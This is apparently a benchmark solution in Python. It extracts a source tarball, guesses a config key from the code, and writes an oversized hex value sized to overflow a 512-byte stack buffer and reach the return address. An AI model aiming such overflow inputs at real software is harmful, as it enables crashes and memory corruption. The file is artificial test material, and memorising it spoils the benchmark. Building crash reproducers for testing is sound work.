import tarfile
import tempfile
import os
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as temp_dir:
            # Extract source code
            try:
                with tarfile.open(src_path) as tar:
                    tar.extractall(path=temp_dir)
            except:
                pass

            # Default parameters
            key = "hex_val"
            sep = "="
            found_config = False
            candidates = []

            # Analyze source for config format and keys
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    path = os.path.join(root, file)
                    
                    # 1. Search for config samples (.conf, .cfg, .ini, examples)
                    if not found_config and (file.endswith(".conf") or file.endswith(".cfg") or "example" in file):
                        try:
                            with open(path, "r", errors="ignore") as f:
                                content = f.read()
                                # Check for Key = Value
                                m = re.search(r'^\s*([a-zA-Z0-9_]+)\s*=\s*', content, re.MULTILINE)
                                if m:
                                    key = m.group(1)
                                    sep = "="
                                    found_config = True
                                elif not m:
                                    # Check for Key : Value
                                    m = re.search(r'^\s*([a-zA-Z0-9_]+)\s*:\s*', content, re.MULTILINE)
                                    if m:
                                        key = m.group(1)
                                        sep = ":"
                                        found_config = True
                                elif not m:
                                    # Check for Key Value
                                    m = re.search(r'^\s*([a-zA-Z0-9_]+)\s+[a-zA-Z0-9"]', content, re.MULTILINE)
                                    if m:
                                        key = m.group(1)
                                        sep = " "
                                        found_config = True
                        except:
                            pass
                    
                    # 2. Search C/C++ files for string literals in comparisons
                    if not found_config and file.endswith((".c", ".cpp", ".cc", ".h")):
                        try:
                            with open(path, "r", errors="ignore") as f:
                                content = f.read()
                                # Regex for strcmp(var, "LITERAL") or similar
                                matches = re.findall(r'(?:str(?:n|case)?cmp|EQUALS)\s*\(\s*[a-zA-Z0-9_>.-]+\s*,\s*"([a-zA-Z0-9_]+)"', content)
                                candidates.extend(matches)
                        except:
                            pass

            # Select best key if config not found
            if not found_config and candidates:
                # Prioritize keys related to the vulnerability hint
                priority = [k for k in candidates if any(x in k.lower() for x in ["hex", "val", "addr", "data", "conf", "color"])]
                if priority:
                    key = priority[0]
                else:
                    key = candidates[0]

            # Generate PoC
            # Vulnerability: Stack Buffer Overflow due to long hex value
            # Ground Truth: 547 bytes -> implies ~512 byte buffer
            # We generate a payload to overflow a 512 byte buffer
            
            # Format: "0x" + hex digits
            # We use 'A' (valid hex) to fill the buffer
            
            # Calculate fill size to reach approximately 550 bytes total file size
            # formula: len(key) + len(sep) + 2 ("0x") + fill_size + 1 (\n) = 550
            target_total = 550
            overhead = len(key) + len(sep) + 3
            fill_size = target_total - overhead
            
            # Ensure minimum overflow length (512 buffer + 8 rbp + 8 ret = 528)
            if fill_size < 530:
                fill_size = 535

            value = "0x" + "A" * fill_size
            
            if sep == " ":
                poc = f"{key} {value}\n"
            else:
                poc = f"{key}{sep}{value}\n"

            return poc.encode('utf-8')
